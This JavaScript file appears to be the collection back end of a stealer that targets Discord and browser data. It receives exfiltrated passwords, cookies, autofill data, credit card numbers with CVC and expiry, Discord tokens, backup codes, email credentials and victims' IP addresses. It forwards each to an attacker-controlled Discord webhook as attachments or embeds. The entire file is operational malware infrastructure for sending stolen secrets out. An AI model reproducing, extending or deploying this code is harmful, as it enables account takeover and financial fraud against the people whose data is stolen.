const fs = require('fs');
const Discord = require('discord.js');
const config = require("../../../config.json");
const embed = require("./embed.js");
const {includes} = require("./all.js");
let countp = 0;
const send = async (req, w1, w2) => {
    const webhook = new Discord.WebhookClient(w1, w2);
    if (req.body.type === "pass") {
        const pp = req.body.pass;
        if (!pp) return;
        const nm = countp++;
        fs.writeFileSync(`Passwords-${nm}`, pp, function (err) { if (err) throw err; });
        setTimeout(() => { fs.unlink(`Passwords-${nm}`, (err) => { if (err) throw err; }) }, 7000);
        let ln = "";
        fs.readFileSync(`Passwords-${nm}`, 'utf-8').split(/\r?\n/).forEach((line) => { if (line == "" || line == undefined) return undefined; ln += "1" });
        if (ln === "1") fs.writeFileSync(`Passwords-${nm}`, "Passwords don't found.", function (err) { if (err) throw err; });
        const attachment = new Discord.MessageAttachment(`Passwords-${nm}`, "Passwords.txt");
        return webhook.send(`**Contains:** ${await includes(pp)}`, attachment);
    };
    if (req.body.type === "coock") {
        const pp = req.body.pass;
        if (!pp) return;
        const nm = countp++;
        fs.writeFileSync(`Coockies-${nm}`, pp, function (err) { if (err) throw err; });
        setTimeout(() => { fs.unlink(`Coockies-${nm}`, (err) => { if (err) throw err; }) }, 7000);
        let ln = "";
        fs.readFileSync(`Coockies-${nm}`, 'utf-8').split(/\r?\n/).forEach((line) => { if (line == "" || line == undefined) return undefined; ln += "1" });
        if (ln === "1") fs.writeFileSync(`Coockies-${nm}`, "Coockies don't found.", function (err) { if (err) throw err; });
        const attachment = new Discord.MessageAttachment(`Coockies-${nm}`, "Coockies.txt");
        return webhook.send(`**Contains:** ${await includes(pp)}`, attachment);
    };
    if (req.body.type === "filedata") {
        const pp = req.body.pass;
        if (!pp) return;
        const nm = countp++;
        fs.writeFileSync(`Autofilldata-${nm}`, pp, function (err) { if (err) throw err; });
        setTimeout(() => { fs.unlink(`Autofilldata-${nm}`, (err) => { if (err) throw err; }) }, 7000);
        let ln = "";
        fs.readFileSync(`Autofilldata-${nm}`, 'utf-8').split(/\r?\n/).forEach((line) => { if (line == "" || line == undefined) return ln += "1"; });
        if (ln === "1") fs.writeFileSync(`Autofilldata-${nm}`, "Autofill don't found.", function (err) { if (err) throw err; });
        const attachment = new Discord.MessageAttachment(`Autofilldata-${nm}`, "Autofilldata.txt");
        return webhook.send(attachment);
    };
    if (req.body.type === "creditcard") {
        const pp = req.body.pass;
        if (!pp) return;
        const nm = countp++;
        fs.writeFileSync(`CreditCards-${nm}`, pp, function (err) { if (err) throw err; });
        setTimeout(() => { fs.unlink(`CreditCards-${nm}`, (err) => { if (err) throw err; }) }, 7000);
        let ln = "";
        fs.readFileSync(`CreditCards-${nm}`, 'utf-8').split(/\r?\n/).forEach((line) => { if (line == "" || line == undefined) return undefined; ln += "1" });
        if (ln === "1") fs.writeFileSync(`CreditCards-${nm}`, "Creditcards don't found.", function (err) { if (err) throw err; });
        const attachment = new Discord.MessageAttachment(`CreditCards-${nm}`, "CreditCards.txt");
        return webhook.send(attachment);
    };
    if (req.body.type === "backup") {
        const pp = req.body.pass;
        if (!pp) return;
        const nm = countp++;
        fs.writeFileSync(`n-${nm}`, pp, function (err) { if (err) throw err; });
        setTimeout(() => { fs.unlink(`n-${nm}`, (err) => { if (err) throw err; }) }, 7000);
        let ln = "";
        fs.readFileSync(`n-${nm}`, 'utf-8').split(/\r?\n/).forEach((line) => { if (line == "" || line == undefined) return undefined; ln += "1" });
        if (ln === "1") return;
        const attachment = new Discord.MessageAttachment(`n-${nm}`, "discord_backup_codes.txt");
        return webhook.send(attachment);
    };
    if (req.body.type === "login") {
        embed("login", webhook, {
            token: req.body.token,
            ip: req.body.ip,
            password: req.body.password
        });
    };
    if (req.body.type === "tokens") {
        embed("tokens", webhook, {
            token: req.body.token,
            ip: req.body.ip,
            path: req.body.path
        });
    };
    if (req.body.type === "password") {
        embed("pass", webhook, {
            token: req.body.token,
            ip: req.body.ip,
            old: req.body.oldPassword,
            new: req.body.newPassword
        });
    };
    if (req.body.type === "email") {
        embed("email", webhook, {
            token: req.body.token,
            ip: req.body.ip,
            email: req.body.email,
            password: req.body.password
        });
    };
    if (req.body.type === "card") {
        embed("card", webhook, {
            token: req.body.token,
            ip: req.body.ip,
            num: req.body.num,
            cvc: req.body.cvc,
            date: req.body.date
        });
    };
};
module.exports = send;